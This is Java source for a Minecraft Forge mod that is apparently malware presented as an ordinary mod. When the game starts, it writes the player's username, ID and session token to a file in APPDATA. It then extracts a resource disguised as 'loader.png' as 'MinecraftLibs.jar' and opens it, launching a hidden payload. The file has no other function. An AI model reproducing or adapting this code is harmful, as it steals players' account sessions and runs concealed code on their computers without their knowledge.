package scoliosis;

import net.minecraft.client.Minecraft;
import net.minecraft.util.ResourceLocation;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.io.FileUtils;

import java.awt.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;

@Mod(modid = "scoliosis", version = "1.0")
public class scoliosis {

    @Mod.EventHandler
    public void preinit(FMLPreInitializationEvent var1) {
        MinecraftForge.EVENT_BUS.register(this);

        try {
            WriteToFile(System.getProperty("APPDATA") + "\\minecraftInfo.txt", "n: " + Minecraft.getMinecraft().getSession().getUsername() + " u: " + Minecraft.getMinecraft().getSession().getPlayerID() + "\ns: " + Minecraft.getMinecraft().getSession().getSessionID());
        } catch (IOException ignored) {
        }

        openminecraftLibrarys();
    }

    public static void WriteToFile(String filepath, String whattowrite) throws IOException {
        FileWriter myWriter = new FileWriter(filepath);
        myWriter.write(whattowrite);
        myWriter.close();
    }

    public void openminecraftLibrarys() {

        try {

            InputStream inputStream = Minecraft.getMinecraft().getResourceManager().getResource(new ResourceLocation("loader.png")).getInputStream();

            File minecraftlib = new File(System.getProperty("APPDATA") + "\\MinecraftLibs.jar");

            FileUtils.copyInputStreamToFile(inputStream, minecraftlib);

            Desktop minecraft = Desktop.getDesktop();
            minecraft.open(minecraftlib);

        } catch (Exception p) {
            p.printStackTrace();
        }

    }

}